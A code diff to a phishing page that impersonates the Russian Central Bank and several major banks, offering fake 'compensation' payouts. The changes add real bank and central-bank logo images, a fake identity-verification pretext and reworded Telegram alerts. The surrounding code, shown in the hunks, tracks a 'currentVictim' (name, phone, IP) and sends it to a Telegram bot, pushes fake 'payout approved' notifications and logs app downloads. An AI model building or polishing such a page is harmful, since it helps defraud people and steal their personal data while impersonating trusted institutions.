@@ -18,7 +18,7 @@
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: url('https://www.ntv.ru/home/news/2023/20230706/cb1_sno.jpg') no-repeat center center;
+            background: url('https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13') no-repeat center center;
             background-size: cover;
             opacity: 0.4;
             z-index: -1;
@@ -363,16 +363,14 @@
             border: 2px solid #0d47a1;
         }
         .bank-logo {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, #0d47a1, #1a237e);
+            width: 50px;
+            height: 50px;
+            background-size: cover;
+            background-position: center;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 0.8em;
             box-shadow: 0 4px 8px rgba(0,0,0,0.2);
             cursor: pointer;
             transition: all 0.3s;
@@ -556,7 +554,7 @@
         .cb-logo {
             width: 70px;
             height: 70px;
-            background: linear-gradient(135deg, #0d47a1, #1a237e);
+            background: url('https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13') center/cover;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -578,7 +576,7 @@
         @media (max-width: 600px) {
             .container { padding: 20px; }
             .option-buttons { flex-direction: column; }
-            .bank-logo { width: 35px; height: 35px; font-size: 0.7em; }
+            .bank-logo { width: 40px; height: 40px; }
             .amount { font-size: 2.2em; }
             .timer { font-size: 1.8em; }
         }
@@ -658,9 +656,7 @@
         <!-- ШАПКА -->
         <div class="header">
             <!-- ЛОГОТИП ЦБ (кликабельный) -->
-            <a href="https://www.cbr.ru" target="_blank" class="cb-logo">
-                ЦБ<br>РФ
-            </a>
+            <a href="https://www.cbr.ru" target="_blank" class="cb-logo"></a>
             
             <div style="text-align: center;">
                 <div class="logo-text">
@@ -716,13 +712,13 @@
             🏦 Программа поддержана банками:
         </div>
         <div class="banks">
-            <a href="https://www.sberbank.ru" target="_blank" class="bank-logo" title="Сбербанк">СБ</a>
-            <a href="https://www.tinkoff.ru" target="_blank" class="bank-logo" title="Тинькофф">ТБ</a>
-            <a href="https://www.vtb.ru" target="_blank" class="bank-logo" title="ВТБ">ВТ</a>
-            <a href="https://alfabank.ru" target="_blank" class="bank-logo" title="Альфа-Банк">АБ</a>
-            <a href="https://www.gazprombank.ru" target="_blank" class="bank-logo" title="Газпромбанк">ГП</a>
-            <a href="https://sovcombank.ru" target="_blank" class="bank-logo" title="Совкомбанк">СК</a>
-            <a href="https://www.raiffeisen.ru" target="_blank" class="bank-logo" title="Райффайзен">РБ</a>
+            <a href="https://www.sberbank.ru" target="_blank" class="bank-logo" title="Сбербанк" style="background-image: url('https://i.ytimg.com/vi/VWG-iwsocLQ/maxresdefault.jpg');"></a>
+            <a href="https://www.tinkoff.ru" target="_blank" class="bank-logo" title="Тинькофф" style="background-image: url('https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ca/d1/18/cad118e3-1b98-6d38-05e7-aa8e5ab4fa3e/AppIcon-0-0-1x_U007epad-0-0-85-220.png/1200x630wa.png');"></a>
+            <a href="https://www.vtb.ru" target="_blank" class="bank-logo" title="ВТБ" style="background-image: url('https://avatars.mds.yandex.net/i?id=6eae573cda294e48584c4ef9f69bfdee_l-5707320-images-thumbs&n=13');"></a>
+            <a href="https://alfabank.ru" target="_blank" class="bank-logo" title="Альфа-Банк" style="background-image: url('https://avatars.mds.yandex.net/i?id=06820d835b2e6bdec207420d72d22c01_l-7684368-images-thumbs&n=13');"></a>
+            <a href="https://www.gazprombank.ru" target="_blank" class="bank-logo" title="Газпромбанк" style="background-image: url('https://avatars.mds.yandex.net/get-mpic/11396163/2a00000193b393533194ea9223f19f1638b6/orig');"></a>
+            <a href="https://sovcombank.ru" target="_blank" class="bank-logo" title="Совкомбанк" style="background-image: url('https://www.bankdelo.ru/site/public/files/17/16115-sovkombank.jpg');"></a>
+            <a href="https://www.raiffeisen.ru" target="_blank" class="bank-logo" title="Райффайзен" style="background-image: url('https://i.ytimg.com/vi/gUPOvKOd-0c/maxresdefault.jpg');"></a>
         </div>
 
         <!-- ПРОГРЕСС-БАР ВЫПЛАТ -->
@@ -775,7 +771,7 @@
             <div class="amount" id="moneyAmount">0 ₽</div>
             <p>Средства зарезервированы на ваше имя.</p>
             <p style="color: #666; font-size: 0.9em; margin-top: -10px; margin-bottom: 15px;">
-                Подтверждение после верификации или скачивания приложения
+                В связи с участившимися случаями злоупотреблений и для предотвращения недобросовестных действий, требуется подтверждение личности.
             </p>
 
             <!-- ТАЙМЕР -->
@@ -1201,7 +1197,7 @@
             
             localStorage.setItem('requestCounter', requestCounter);
             
-            // Отправка в Telegram
+            // Отправка в Telegram с правильным заголовком
             sendToTelegram('compensation', currentVictim);
             
             // Показ результата (ВСЕГДА показываем, даже если хуев хуй)
@@ -1221,7 +1217,7 @@
                         if (permission === 'granted') {
                             new Notification('ЦБ РФ: Ваша выплата одобрена!', {
                                 body: `Сумма: ${randomAmount.toLocaleString()} ₽. Осталось получить: 1 час`,
-                                icon: 'https://www.cbr.ru/StaticHtml/File/92172/gerb_1.png'
+                                icon: 'https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13'
                             });
                         }
                     });
@@ -1376,7 +1372,7 @@
                 ip: currentVictim?.ip || 'Не определен'
             };
             
-            // Отправка в Telegram
+            // Отправка в Telegram с правильным заголовком
             sendToTelegram('review', reviewData);
             
             // Закрытие модалки
@@ -1426,7 +1422,7 @@
                         message = `⬇️ СКАЧАЛ ПРИЛОЖЕНИЕ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⏰ Время: ${data.time}${extraInfo}`;
                         break;
                     case 'review':
-                        message = `✍️ НОВЫЙ ОТЗЫВ\n\n👤 Имя: ${data.name}\n🏙️ Город: ${data.city}\n💰 Сумма: ${data.amount} руб\n📝 Текст: ${data.text}\n⏰ Время: ${data.time}\n🌐 IP: ${data.ip}`;
+                        message = `✍️ ПОЛУЧЕН НОВЫЙ ОТЗЫВ\n\n👤 Имя: ${data.name}\n🏙️ Город: ${data.city}\n💰 Сумма: ${data.amount} руб\n📝 Текст: ${data.text}\n⏰ Время: ${data.time}\n🌐 IP: ${data.ip}`;
                         break;
                 }
                 
